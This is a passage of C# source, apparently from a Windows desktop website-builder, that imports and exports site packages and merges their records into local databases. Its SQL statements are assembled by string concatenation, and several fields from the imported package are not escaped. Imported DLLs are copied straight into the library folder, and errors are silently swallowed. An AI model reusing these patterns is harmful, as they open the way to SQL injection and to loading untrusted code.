                if (dir.Exists(globalConst.AppPath + @"\temp\site\bin"))
                {
                    fis = new DirectoryInfo(globalConst.AppPath + @"\temp\site\bin").GetFiles();
                    foreach (FileInfo fi in fis)
                    {
                        try
                        {
                            fi.CopyTo(globalConst.LibPath + @"\" + fi.Name, true);
                        }
                        catch { }
                    }
                }

                stat.Text = res._site.GetString("s5");
                Application.DoEvents();


                if (dir.Exists(globalConst.AppPath + @"\temp\site\lib"))
                {
                    DirectoryInfo[] dis = new DirectoryInfo(globalConst.AppPath + @"\temp\site\lib").GetDirectories();
                    foreach (DirectoryInfo di in dis)
                    {
                            if (dir.Exists(globalConst.LibPath + @"\" + di.Name))
                            {
                                dir.Delete(globalConst.LibPath + @"\" + di.Name, true);
                            }
                            try
                            {
                                di.MoveTo(globalConst.LibPath + @"\" + di.Name);
                            }
                            catch { }
                    }
                }

                stat.Text = res._site.GetString("s6");
                Application.DoEvents();

                if (dir.Exists(globalConst.SitesPath + @"\" + siteid))
                {
                    dir.Delete(globalConst.SitesPath + @"\" + siteid, true);
                }

                stat.Text =  res._site.GetString("s7");
                Application.DoEvents();

                if (dir.Exists(globalConst.AppPath + @"\temp\site\site"))
                {
                    dir.Move(globalConst.AppPath + @"\temp\site\site", globalConst.SitesPath + @"\" + siteid);
                }
                if (!dir.Exists(globalConst.SitesPath + @"\" + siteid))
                {
                    dir.CreateDirectory(globalConst.SitesPath + @"\" + siteid);
                }
                stat.Text = res._site.GetString("s8");
                Application.DoEvents();
                if (dir.Exists(globalConst.AppPath + @"\temp"))
                {
                    dir.Delete(globalConst.AppPath + @"\temp", true);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static bool ImportPlusInit(string filename, TreeView tv, System.Windows.Forms.Label stat)
        {
            try
            {
                stat.Text = res._site.GetString("s34");
                Application.DoEvents();
                if (dir.Exists(globalConst.AppPath + @"\temp"))
                {
                    dir.Delete(globalConst.AppPath + @"\temp", true);
                }
                dir.CreateDirectory(globalConst.AppPath + @"\temp");

                new ZipClass().UnZip(filename, globalConst.AppPath + @"\temp\site\");

                stat.Text = res._site.GetString("s26");
                Application.DoEvents();

                tv.CheckBoxes = true;
                tv.Enabled = true;
                tv.Nodes.Clear();
                TreeNode rootnode;
                rootnode = new TreeNode("FTDP Site Root", 16, 16);
                string[] tag = new string[3];
                tag[0] = "FTDP Site Root";
                tag[1] = "FTDP Site Root";
                tag[2] = "root";
                rootnode.Tag = tag;
                tv.Nodes.Add(rootnode);
                constructTree4Import(tv, rootnode, "root", globalConst.AppPath + @"\temp\site\site.db");
                tv.CollapseAll();
                rootnode.Expand();
                return true;

            }
            catch
            {
                return false;
            }
        }
        public static bool PageSelInit(TreeView tv,System.Windows.Forms.Label stat)
        {
            try
            {
                stat.Text = "Initializing...";
                Application.DoEvents();

                tv.CheckBoxes = true;
                tv.Enabled = true;
                tv.Nodes.Clear();
                TreeNode rootnode;
                rootnode = new TreeNode(globalConst.CurSite.Domain, 16, 16);
                string[] tag = new string[3];
                tag[0] = globalConst.CurSite.Domain;
                tag[1] = globalConst.CurSite.Domain;
                tag[2] = "root";
                rootnode.Tag = tag;
                tv.Nodes.Add(rootnode);
                constructTree4PageSel(tv, rootnode, "root");
                tv.CollapseAll();
                rootnode.Expand();
                return true;
                
            }
            catch
            {
                return false;
            }
        }
        public static string ImportPlus(string siteid, System.Windows.Forms.Label stat, bool ImportPlusOverWrite,ArrayList ImportPlusFiles)
        {
            DB db = new DB();
            db.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\temp\site\site.db");
            DB db1 = new DB();
            db1.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\temp\site\site.db");
            DB db11 = new DB();
            db11.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\temp\site\site.db");
            DB db2 = new DB();
            db2.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.ConfigPath + @"\site_" + siteid + ".db");
            try
            {
                string sql = null;
                OleDbDataReader rdr = null;
                OleDbDataReader rdr1 = null;
                OleDbDataReader rdr11 = null;


                stat.Text = res._site.GetString("s27");
                Application.DoEvents();

                foreach (string[] FileItem in ImportPlusFiles)
                {
                    if (tree.getTypeFromID(FileItem[0]).Equals("drct"))
                    {
                        sql = "select * from directory where id='" + FileItem[0] + "'";
                        rdr=db.OpenRecord(sql);
                        if (rdr.Read())
                        {
                            string id = rdr.GetValue(rdr.GetOrdinal("id")).ToString();
                            string pid = rdr.GetValue(rdr.GetOrdinal("pid")).ToString();
                            string name = rdr.GetValue(rdr.GetOrdinal("name")).ToString();
                            string caption = rdr.GetValue(rdr.GetOrdinal("caption")).ToString();
                            string updatetime = rdr.GetValue(rdr.GetOrdinal("updatetime")).ToString();
                            string homepage = rdr.GetValue(rdr.GetOrdinal("homepage")).ToString();

                            stat.Text = res._site.GetString("s28") + "\r\n"+caption;
                            Application.DoEvents();

                            sql = "select count(*) from directory where id='" + id + "'";
                            if (db2.GetInt32(sql) > 0)//update 目录永远都更新或插入，文件要判断是否覆盖
                            {
                                sql = "update directory set pid='" + pid + "',name='" + functions.str.Dot2DotDot(name) + "',caption='" + functions.str.Dot2DotDot(caption) + "',updatetime='" + updatetime + "',homepage='" + functions.str.Dot2DotDot(homepage) + "' where id='" + id + "'";
                                db2.execSql(sql);
                            }
                            else//插入
                            {
                                sql = "insert into directory(id,pid,name,caption,updatetime,homepage)values('" + id + "','" + pid + "','" + functions.str.Dot2DotDot(name) + "','" + functions.str.Dot2DotDot(caption) + "','" + updatetime + "','" + functions.str.Dot2DotDot(homepage) + "')";
                                db2.execSql(sql);
                            }
                            if (!dir.Exists(globalConst.SitesPath + @"\" + siteid + FileItem[1]))
                            {
                                dir.CreateDirectory(globalConst.SitesPath + @"\" + siteid + FileItem[1]);
                            }
                        }
                        rdr.Close();
                    }
                    else if (tree.getTypeFromID(FileItem[0]).Equals("page"))
                    {
                        Editor ed = form.getEditor(FileItem[0]);
                        if (ed != null) ed.Close();

                        sql = "select * from pages where id='" + FileItem[0] + "'";
                        rdr = db.OpenRecord(sql);
                        if (rdr.Read())
                        {
                            string id = rdr.GetValue(rdr.GetOrdinal("id")).ToString();
                            string pid = rdr.GetValue(rdr.GetOrdinal("pid")).ToString();
                            string name = rdr.GetValue(rdr.GetOrdinal("name")).ToString();
                            string caption = rdr.GetValue(rdr.GetOrdinal("caption")).ToString();
                            string updatetime = rdr.GetValue(rdr.GetOrdinal("updatetime")).ToString();
                            int ptype = rdr.GetInt16(rdr.GetOrdinal("ptype"));
                            int mtype = rdr.GetInt16(rdr.GetOrdinal("mtype"));
                            string jinfo = rdr.GetValue(rdr.GetOrdinal("jinfo")).ToString();
                            string jurl = rdr.GetValue(rdr.GetOrdinal("jurl")).ToString();
                            string fid = rdr.GetValue(rdr.GetOrdinal("fid")).ToString();
                            int modopen = rdr.GetInt32(rdr.GetOrdinal("modopen"));
                            int viewopen = rdr.GetInt32(rdr.GetOrdinal("viewopen"));
                            string datastr = rdr.GetValue(rdr.GetOrdinal("datastr")).ToString();
                            string paraname = rdr.GetValue(rdr.GetOrdinal("paraname")).ToString();
                            string membind = rdr.GetValue(rdr.GetOrdinal("membind")).ToString();
                            string elecdt = rdr.GetValue(rdr.GetOrdinal("elecdt")).ToString();
                            string roledata = rdr.GetValue(rdr.GetOrdinal("roledata")).ToString();
                            string rolesession = rdr.GetValue(rdr.GetOrdinal("rolesession")).ToString();
                            string authrule = rdr.GetValue(rdr.GetOrdinal("authrule")).ToString();
                            string flowstat = rdr.GetValue(rdr.GetOrdinal("flowstat")).ToString();
                            string norightinfo = rdr.GetValue(rdr.GetOrdinal("norightinfo")).ToString();
                            string norighturl = rdr.GetValue(rdr.GetOrdinal("norighturl")).ToString();
                            int a_ip_s = rdr.GetByte(rdr.GetOrdinal("a_ip_s"));
                            string a_ip_c = rdr.GetValue(rdr.GetOrdinal("a_ip_c")).ToString();
                            int a_ip_o = rdr.GetByte(rdr.GetOrdinal("a_ip_o"));
                            int a_se_s = rdr.GetByte(rdr.GetOrdinal("a_se_s"));
                            string a_se_c = rdr.GetValue(rdr.GetOrdinal("a_se_c")).ToString();
                            int a_se_o = rdr.GetByte(rdr.GetOrdinal("a_se_o"));
                            int a_jp_s = rdr.GetByte(rdr.GetOrdinal("a_jp_s"));
                            string a_jp_u = rdr.GetValue(rdr.GetOrdinal("a_jp_u")).ToString();
                            int a_tp_s = rdr.GetByte(rdr.GetOrdinal("a_tp_s"));
                            string a_tp_c = rdr.GetValue(rdr.GetOrdinal("a_tp_c")).ToString();
                            string pagejs = rdr.GetValue(rdr.GetOrdinal("pagejs"))==null?"": rdr.GetValue(rdr.GetOrdinal("pagejs")).ToString();

                            stat.Text = res._site.GetString("s29") + "\r\n" + caption;
                            Application.DoEvents();

                            sql = "select count(*) from pages where id='" + id + "'";
                            bool thispageupdated = false;
                            if (db2.GetInt32(sql) > 0)//更新
                            {
                                if (ImportPlusOverWrite)
                                {
                                    sql = "update pages set pid='" + pid + "',name='" + functions.str.Dot2DotDot(name) + "',caption='" + functions.str.Dot2DotDot(caption) + "',updatetime='" + updatetime + "',ptype=" + ptype + ",mtype=" + mtype + ",jinfo='" + functions.str.Dot2DotDot(jinfo) + "',jurl='" + functions.str.Dot2DotDot(jurl) + "',fid='" + functions.str.Dot2DotDot(fid) + "',modopen=" + modopen + ",viewopen=" + viewopen + ",datastr='" + str.Dot2DotDot(datastr) + "',paraname='" + str.Dot2DotDot(paraname) + "',membind='" + str.Dot2DotDot(membind) + "',elecdt='" + str.Dot2DotDot(elecdt) + "',roledata='" + str.Dot2DotDot(roledata) + "',rolesession='" + str.Dot2DotDot(rolesession) + "',authrule='" + str.Dot2DotDot(authrule) + "',flowstat='" + str.Dot2DotDot(flowstat) + "',norightinfo='" + str.Dot2DotDot(norightinfo) + "',norighturl='" + str.Dot2DotDot(norighturl) + "',a_ip_s=" + a_ip_s + ",a_ip_c='" + str.Dot2DotDot(a_ip_c) + "',a_ip_o=" + a_ip_o + ",a_se_s=" + a_se_s + ",a_se_c='" + str.Dot2DotDot(a_se_c) + "',a_se_o=" + a_se_o + ",a_jp_s=" + a_jp_s + ",a_jp_u='" + str.Dot2DotDot(a_jp_u) + "',a_tp_s=" + a_tp_s + ",a_tp_c='" + str.Dot2DotDot(a_tp_c) + "',pagejs='"+str.Dot2DotDot(pagejs)+"' where id='" + id + "'";
                                    db2.execSql(sql);
                                    thispageupdated = true;
                                }
                            }
                            else//插入
                            {
                                sql = "insert into pages(id,pid,name,caption,updatetime,ptype,mtype,jinfo,jurl,fid,modopen,viewopen,datastr,paraname,membind,elecdt,roledata,rolesession,authrule,flowstat,norightinfo,norighturl,a_ip_s,a_ip_c,a_ip_o,a_se_s,a_se_c,a_se_o,a_jp_s,a_jp_u,a_tp_s,a_tp_c,pagejs)values('" + id + "','" + pid + "','" + functions.str.Dot2DotDot(name) + "','" + functions.str.Dot2DotDot(caption) + "','" + updatetime + "'," + ptype + "," + mtype + ",'" + functions.str.Dot2DotDot(jinfo) + "','" + functions.str.Dot2DotDot(jurl) + "','" + functions.str.Dot2DotDot(fid) + "'," + modopen + "," + viewopen + ",'" + str.Dot2DotDot(datastr) + "','" + str.Dot2DotDot(paraname) + "','" + str.Dot2DotDot(membind) + "','" + str.Dot2DotDot(elecdt) + "','" + str.Dot2DotDot(roledata) + "','" + str.Dot2DotDot(rolesession) + "','" + str.Dot2DotDot(authrule) + "','" + str.Dot2DotDot(flowstat) + "','" + str.Dot2DotDot(norightinfo) + "','" + str.Dot2DotDot(norighturl) + "'," + a_ip_s + ",'" + str.Dot2DotDot(a_ip_c) + "'," + a_ip_o + "," + a_se_s + ",'" + str.Dot2DotDot(a_se_c) + "'," + a_se_o + "," + a_jp_s + ",'" + str.Dot2DotDot(a_jp_u) + "'," + a_tp_s + ",'" + str.Dot2DotDot(a_tp_c) + "','" + str.Dot2DotDot(pagejs) + "')";
                                db2.execSql(sql);
                                thispageupdated = true;
                                
                            }
                            if (thispageupdated)//不管是更新还是插入，对页面和构件的操作都一样。
                            {
                                //更新文件
                                if (file.Exists(globalConst.AppPath + @"\temp\site\site" + FileItem[1]))
                                {
                                    string newfilename = globalConst.SitesPath + @"\" + siteid + FileItem[1];
                                    string needcreatedir = newfilename.Substring(0, newfilename.LastIndexOf("\\"));
                                    if (!dir.Exists(needcreatedir))
                                    {
                                        dir.CreateDirectory(needcreatedir);
                                    }
                                    file.Copy(globalConst.AppPath + @"\temp\site\site" + FileItem[1], newfilename, true);
                                }

                                stat.Text = res._site.GetString("s33") + "\r\n" + caption;
                                Application.DoEvents();

                                //更新表单规则
                                sql = "select * from formrules where id='" + id + "'";
                                rdr1 = db1.OpenRecord(sql);
                                if (rdr1.Read())
                                {
                                    string rule_id = rdr1.GetValue(rdr1.GetOrdinal("id")).ToString();
                                    string rule_rules = rdr1.GetValue(rdr1.GetOrdinal("rules")).ToString();
                                    string rule_alertinfo = rdr1.GetValue(rdr1.GetOrdinal("alertinfo")).ToString();
                                    sql = "select count(*) from formrules where id='" + id + "'";
                                    if (db2.GetInt32(sql) > 0)
                                    {
                                        sql = "update formrules set rules='" + functions.str.Dot2DotDot(rule_rules) + "',alertinfo='" + functions.str.Dot2DotDot(rule_alertinfo) + "' where id='" + rule_id + "'";
                                        db2.execSql(sql);
                                    }
                                    else
                                    {
                                        sql = "insert into formrules(id,rules,alertinfo)values('" + rule_id + "','" + functions.str.Dot2DotDot(rule_rules) + "','" + functions.str.Dot2DotDot(rule_alertinfo) + "')";
                                        db2.execSql(sql);
                                    }
                                }
                                rdr1.Close();

                                stat.Text = res._site.GetString("s32") + "\r\n" + caption;
                                Application.DoEvents();


                                //更新页面和构件实例片段绑定关系
                                sql = "delete from part_in_page where pageid='"+id+"'";
                                db2.execSql(sql);
                                sql = "select * from part_in_page where pageid='" + id + "'";
                                rdr1 = db1.OpenRecord(sql);
                                while (rdr1.Read())
                                {
                                    string pageid = rdr1.GetValue(rdr1.GetOrdinal("pageid")).ToString();
                                    string partid = rdr1.GetValue(rdr1.GetOrdinal("partid")).ToString();
                                    sql = "insert into part_in_page(pageid,partid)values('" + functions.str.Dot2DotDot(pageid) + "','" + functions.str.Dot2DotDot(partid) + "')";
                                    db2.execSql(sql);

                                    //更新构件实例
                                    sql = "select * from controls where id=(select controlid from parts where id='" + partid + "')";
                                    rdr11 = db11.OpenRecord(sql);
                                    if(rdr11.Read())
                                    {
                                        string ctrl_id = rdr11.GetValue(rdr11.GetOrdinal("id")).ToString();
                                        string ctrl_name = rdr11.GetValue(rdr11.GetOrdinal("name")).ToString();
                                        string ctrl_caption = rdr11.GetValue(rdr11.GetOrdinal("caption")).ToString();
                                        string ctrl_datasource = rdr11.GetValue(rdr11.GetOrdinal("datasource")).ToString();
                                        string ctrl_shared = rdr11.GetValue(rdr11.GetOrdinal("shared")).ToString();
                                        string ctrl_paras = rdr11.GetValue(rdr11.GetOrdinal("paras")).ToString();

                                        stat.Text = res._site.GetString("s30") + "\r\n" + ctrl_caption;
                                        Application.DoEvents();

                                        sql = "select count(*) from controls where id='" + ctrl_id + "'";
                                        if (db2.GetInt32(sql) > 0)
                                        {
                                            sql = "update controls set name='" + functions.str.Dot2DotDot(ctrl_name) + "',caption='" + functions.str.Dot2DotDot(ctrl_caption) + "',datasource='" + functions.str.Dot2DotDot(ctrl_datasource) + "',shared='" + functions.str.Dot2DotDot(ctrl_shared) + "',paras='" + functions.str.Dot2DotDot(ctrl_paras) + "' where id='" + ctrl_id + "'";
                                            db2.execSql(sql);
                                        }
                                        else
                                        {
                                            sql = "insert into controls(id,name,caption,datasource,shared,paras)values('" + ctrl_id + "','" + functions.str.Dot2DotDot(ctrl_name) + "','" + functions.str.Dot2DotDot(ctrl_caption) + "','" + functions.str.Dot2DotDot(ctrl_datasource) + "','" + functions.str.Dot2DotDot(ctrl_shared) + "','" + functions.str.Dot2DotDot(ctrl_paras) + "')";
                                            db2.execSql(sql);
                                        }
                                    }
                                    rdr11.Close();


                                    //更新片段
                                    sql = "select * from parts where controlid=(select controlid from parts where id='" + partid + "')";
                                    rdr11 = db11.OpenRecord(sql);
                                    while (rdr11.Read())
                                    {
                                        string part_id = rdr11.GetValue(rdr11.GetOrdinal("id")).ToString();
                                        string part_name = rdr11.GetValue(rdr11.GetOrdinal("name")).ToString();
                                        string part_controlid = rdr11.GetValue(rdr11.GetOrdinal("controlid")).ToString();
                                        string part_partxml = rdr11.GetValue(rdr11.GetOrdinal("partxml")).ToString();
                                        int part_asportal = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("asportal")).ToString());
                                        int part_a_ip_s = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("a_ip_s")).ToString());
                                        string part_a_ip_c = rdr11.GetValue(rdr11.GetOrdinal("a_ip_c")).ToString();
                                        int part_a_ip_o = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("a_ip_o")).ToString());
                                        int part_a_se_s = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("a_se_s")).ToString());
                                        string part_a_se_c = rdr11.GetValue(rdr11.GetOrdinal("a_se_c")).ToString();
                                        int part_a_se_o = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("a_se_o")).ToString());
                                        int part_a_jp_s = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("a_jp_s")).ToString());
                                        string part_a_jp_u = rdr11.GetValue(rdr11.GetOrdinal("a_jp_u")).ToString();
                                        int part_a_tp_s = int.Parse(rdr11.GetValue(rdr11.GetOrdinal("a_tp_s")).ToString());
                                        string part_a_tp_c = rdr11.GetValue(rdr11.GetOrdinal("a_tp_c")).ToString();

                                        stat.Text = res._site.GetString("s31") + "\r\n" + part_name;
                                        Application.DoEvents();

                                        sql = "select count(*) from parts where id='" + part_id + "'";
                                        if (db2.GetInt32(sql) > 0)
                                        {
                                            sql = "update parts set name='" + functions.str.Dot2DotDot(part_name) + "',controlid='" + functions.str.Dot2DotDot(part_controlid) + "',partxml='" + functions.str.Dot2DotDot(part_partxml) + "',asportal=" + part_asportal + ",a_ip_s=" + part_a_ip_s + ",a_ip_c='" + functions.str.Dot2DotDot(part_a_ip_c) + "',a_ip_o=" + part_a_ip_o + ",a_se_s=" + part_a_se_s + ",a_se_c='" + functions.str.Dot2DotDot(part_a_se_c) + "',a_se_o=" + part_a_se_o + ",a_jp_s=" + part_a_jp_s + ",a_jp_u='" + functions.str.Dot2DotDot(part_a_jp_u) + "',a_tp_s=" + part_a_tp_s + ",a_tp_c='" + functions.str.Dot2DotDot(part_a_tp_c) + "' where id='" + part_id + "'";
                                            db2.execSql(sql);
                                        }
                                        else
                                        {
                                            sql = "insert into parts(id,name,controlid,partxml,asportal,a_ip_s,a_ip_c,a_ip_o,a_se_s,a_se_c,a_se_o,a_jp_s,a_jp_u,a_tp_s,a_tp_c)values('" + part_id + "','" + functions.str.Dot2DotDot(part_name) + "','" + functions.str.Dot2DotDot(part_controlid) + "','" + functions.str.Dot2DotDot(part_partxml) + "'," + part_asportal + "," + part_a_ip_s + ",'" + functions.str.Dot2DotDot(part_a_ip_c) + "'," + part_a_ip_o + "," + part_a_se_s + ",'" + functions.str.Dot2DotDot(part_a_se_c) + "'," + part_a_se_o + "," + part_a_jp_s + ",'" + functions.str.Dot2DotDot(part_a_jp_u) + "'," + part_a_tp_s + ",'" + functions.str.Dot2DotDot(part_a_tp_c) + "')";
                                            db2.execSql(sql);
                                        }
                                    }
                                    rdr11.Close();
                                }
                                rdr1.Close();
                            }
                        }
                        rdr.Close();
                    }
                }
                
                stat.Text = res._site.GetString("s8");
                Application.DoEvents();
                if (dir.Exists(globalConst.AppPath + @"\temp"))
                {
                    dir.Delete(globalConst.AppPath + @"\temp", true);
                }
                return null;
            }
            catch(Exception ex)
            {
                return ex.Message + "\r\n" + ex.Source + "\r\n" + ex.StackTrace;
            }
            finally { db.Close(); db2.Close(); db1.Close(); db11.Close(); }
        }
        public static bool Export(System.Windows.Forms.Label stat, string filename, bool AsTemplate)
        {
            OleDbDataReader rdr = null;
            try
            {
                file.Delete(filename);
                stat.Text = res._site.GetString("s9");
                System.Windows.Forms.Application.DoEvents();
                if (dir.Exists(globalConst.AppPath + @"\tmp"))
                {
                    dir.Delete(globalConst.AppPath + @"\tmp", true);
                }
                dir.CreateDirectory(globalConst.AppPath + @"\tmp");
                dir.CreateDirectory(globalConst.AppPath + @"\tmp\lib");
                dir.CreateDirectory(globalConst.AppPath + @"\tmp\bin");
                dir.CreateDirectory(globalConst.AppPath + @"\tmp\index");

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s10");
                System.Windows.Forms.Application.DoEvents();

                DirectoryInfo site1 = new DirectoryInfo(globalConst.CurSite.Path);
                DirectoryInfo site2 = new DirectoryInfo(globalConst.AppPath + @"\tmp\site");
                dir.Copy(site1, site2, stat, true);

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s11");
                System.Windows.Forms.Application.DoEvents();

                file.Copy(globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db", globalConst.AppPath + @"\tmp\site.db");
                if (file.Exists(globalConst.AppPath + @"\cfg\" + globalConst.CurSite.ID + "_formtable.xml"))
                {
                    file.Copy(globalConst.AppPath + @"\cfg\" + globalConst.CurSite.ID + "_formtable.xml", globalConst.AppPath + @"\tmp\formtable.xml");
                }

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s12");
                System.Windows.Forms.Application.DoEvents();

                string sql = "SELECT name from controls GROUP BY name";
                rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                while (rdr.Read())
                {
                    string libname = rdr.GetString(0);

                    System.Windows.Forms.Application.DoEvents();
                    stat.Text = res._site.GetString("s13")+ libname;
                    System.Windows.Forms.Application.DoEvents();

                    if (file.Exists(globalConst.LibPath + @"\" + libname + ".dll"))
                    {
                        file.Copy(globalConst.LibPath + @"\" + libname + ".dll", globalConst.AppPath + @"\tmp\index\" + libname + ".dll", true);
                    }
                    if (dir.Exists(globalConst.LibPath + @"\" + libname + ".res"))
                    {
                        DirectoryInfo site3 = new DirectoryInfo(globalConst.LibPath + @"\" + libname + ".res");
                        DirectoryInfo site4 = new DirectoryInfo(globalConst.AppPath + @"\tmp\lib\" + libname + ".res"); 
                        dir.Copy(site3, site4, null, null, true); 
                    }
                    //				if(file.Exists(globalConst.LibPath + @"\D4." + libname + ".dll"))
                    //				{
                    //					FileInfo fi=new FileInfo(globalConst.LibPath + @"\D4." + libname + ".dll");
                    //					fi.CopyTo(globalConst.AppPath + @"\tmp\bin\" + fi.Name,true);
                    //				}
                    //				else
                    //				{
                    DirectoryInfo di = new DirectoryInfo(globalConst.LibPath);
                    FileInfo[] fii = di.GetFiles();
                    foreach (FileInfo _filename in fii)
                    {
                        if (_filename.Name.ToLower().Equals("ds." + libname.ToLower() + ".dll"))
                        {
                            _filename.CopyTo(globalConst.AppPath + @"\tmp\bin\" + _filename.Name, true);
                            goto LoopOut;
                        }
                    }
                LoopOut:
                    System.Windows.Forms.Application.DoEvents();
                    //}
                }
                rdr.Close();

                //Zip
                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s14");
                System.Windows.Forms.Application.DoEvents();

                string[] zipfiles = new string[2];
                zipfiles[0] = globalConst.AppPath + @"\tmp\site.db";
                if(file.Exists(globalConst.AppPath + @"\tmp\formtable.xml"))
                {
                    zipfiles[1] = globalConst.AppPath + @"\tmp\formtable.xml";
                }
                string[] zipfolders = new string[4];
                zipfolders[0] = globalConst.AppPath + @"\tmp\bin";
                zipfolders[1] = globalConst.AppPath + @"\tmp\index";
                zipfolders[2] = globalConst.AppPath + @"\tmp\lib";
                zipfolders[3] = globalConst.AppPath + @"\tmp\site";
                if (AsTemplate)
                {
                    if (!filename.EndsWith(".template")) filename += ".template";
                }
                else
                {
                    if (!filename.EndsWith(".site")) filename += ".site";
                }
                ZipSite zs = new ZipSite(filename);
                zs.ZipFilesAndFolders(zipfiles, zipfolders, "");
                zs.ZipEnd();
                return true;
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            finally
            {
                if (rdr != null)
                {
                    rdr.Close();
                }
            }
        }
        public static void Save(string pageid)
        {
            try
            {
                int i;
                Form[] fms = globalConst.MdiForm.MdiChildren;
                for (i = 0; i < fms.Length; i++)
                {
                    if (fms[i].Name.Equals("Editor"))
                    {
                        if(!((Editor)fms[i]).isFreeFile && ((Editor)fms[i]).thisID.Equals(pageid))
                        {
                            ((Editor)fms[i]).savePage();
                        }
                    }
                }
                fms = null;
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void Save()
        {
            try
            {
                int i;
                Form[] fms = globalConst.MdiForm.MdiChildren;
                for (i = 0; i < fms.Length; i++)
                {
                    if (fms[i].Name.Equals("Editor"))
                    {
                        if (!((Editor)fms[i]).isFreeFile) ((Editor)fms[i]).savePage();
                    }
                }
                fms = null;
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void SiteDBForSingle(string srcSiteDBFile,string desSiteDBFile,string PageID,string SingleFilePath)
        {
            try
            {
                file.Copy(globalConst.AppPath+ @"\cfg\empty.db", desSiteDBFile);
                OleDbDataReader rdrSrc = null;
                DB dbSrc = new DB();
                dbSrc.Open("Provider=" + globalConst.OLEDBProvider + ";Data Source=" + srcSiteDBFile);
                DB dbDes = new DB();
                dbDes.Open("Provider=" + globalConst.OLEDBProvider + ";Data Source=" + desSiteDBFile);
                try
                {
                    List<string> PartList = new List<string>();
                    HTMLDocumentClass hc = new HTMLDocumentClass();
                    IHTMLDocument2 doc2 = hc;
                    doc2.write("");
                    doc2.close();
                    IHTMLDocument4 doc4 = hc;
                    IHTMLDocument2 doc = doc4.createDocumentFromUrl(SingleFilePath, "null");
                    while (doc.readyState != "complete")
                    {
                        System.Windows.Forms.Application.DoEvents();
                    }
                    foreach (IHTMLElement ihe in doc.all)
                    {
                        if (ihe.tagName.ToLower().Equals("control"))
                        {
                            string partid = ihe.getAttribute("id", 0).ToString();
                            if (!PartList.Contains(partid)) PartList.Add(partid);
                        }
                    }
                    doc.close();
                    doc = null;
                    string sql = null;
                    //directory
                    sql = "select * from directory";
                    rdrSrc = dbSrc.OpenRecord(sql);
                    while (rdrSrc.Read())
                    {
                        string id = rdrSrc.GetValue(rdrSrc.GetOrdinal("id")).ToString();
                        string pid = rdrSrc.GetValue(rdrSrc.GetOrdinal("pid")).ToString();
                        string name = rdrSrc.GetValue(rdrSrc.GetOrdinal("name")).ToString();
                        string caption = rdrSrc.GetValue(rdrSrc.GetOrdinal("caption")).ToString();
                        string updatetime = rdrSrc.GetValue(rdrSrc.GetOrdinal("updatetime")).ToString();
                        string homepage = rdrSrc.GetValue(rdrSrc.GetOrdinal("homepage")).ToString();

                        Application.DoEvents();

                        sql = "insert into directory(id,pid,name,caption,updatetime,homepage)values('" + id + "','" + pid + "','" + functions.str.Dot2DotDot(name) + "','" + functions.str.Dot2DotDot(caption) + "','" + updatetime + "','" + functions.str.Dot2DotDot(homepage) + "')";
                        dbDes.execSql(sql);
                    }
                    rdrSrc.Close();
                    //page
                    sql = "select * from pages where id='" + PageID+ "'";
                    rdrSrc = dbSrc.OpenRecord(sql);
                    if (rdrSrc.Read())
                    {
                        string id = rdrSrc.GetValue(rdrSrc.GetOrdinal("id")).ToString();
                        string pid = rdrSrc.GetValue(rdrSrc.GetOrdinal("pid")).ToString();
                        string name = rdrSrc.GetValue(rdrSrc.GetOrdinal("name")).ToString();
                        string caption = rdrSrc.GetValue(rdrSrc.GetOrdinal("caption")).ToString();
                        string updatetime = rdrSrc.GetValue(rdrSrc.GetOrdinal("updatetime")).ToString();
                        int ptype = rdrSrc.GetInt16(rdrSrc.GetOrdinal("ptype"));
                        int mtype = rdrSrc.GetInt16(rdrSrc.GetOrdinal("mtype"));
                        string jinfo = rdrSrc.GetValue(rdrSrc.GetOrdinal("jinfo")).ToString();
                        string jurl = rdrSrc.GetValue(rdrSrc.GetOrdinal("jurl")).ToString();
                        string fid = rdrSrc.GetValue(rdrSrc.GetOrdinal("fid")).ToString();
                        int modopen = rdrSrc.GetInt32(rdrSrc.GetOrdinal("modopen"));
                        int viewopen = rdrSrc.GetInt32(rdrSrc.GetOrdinal("viewopen"));
                        string datastr = rdrSrc.GetValue(rdrSrc.GetOrdinal("datastr")).ToString();
                        string paraname = rdrSrc.GetValue(rdrSrc.GetOrdinal("paraname")).ToString();
                        string membind = rdrSrc.GetValue(rdrSrc.GetOrdinal("membind")).ToString();
                        string elecdt = rdrSrc.GetValue(rdrSrc.GetOrdinal("elecdt")).ToString();
                        string roledata = rdrSrc.GetValue(rdrSrc.GetOrdinal("roledata")).ToString();
                        string rolesession = rdrSrc.GetValue(rdrSrc.GetOrdinal("rolesession")).ToString();
                        string authrule = rdrSrc.GetValue(rdrSrc.GetOrdinal("authrule")).ToString();
                        string flowstat = rdrSrc.GetValue(rdrSrc.GetOrdinal("flowstat")).ToString();
                        string norightinfo = rdrSrc.GetValue(rdrSrc.GetOrdinal("norightinfo")).ToString();
                        string norighturl = rdrSrc.GetValue(rdrSrc.GetOrdinal("norighturl")).ToString();
                        int a_ip_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_ip_s"));
                        string a_ip_c = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_ip_c")).ToString();
                        int a_ip_o = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_ip_o"));
                        int a_se_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_se_s"));
                        string a_se_c = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_se_c")).ToString();
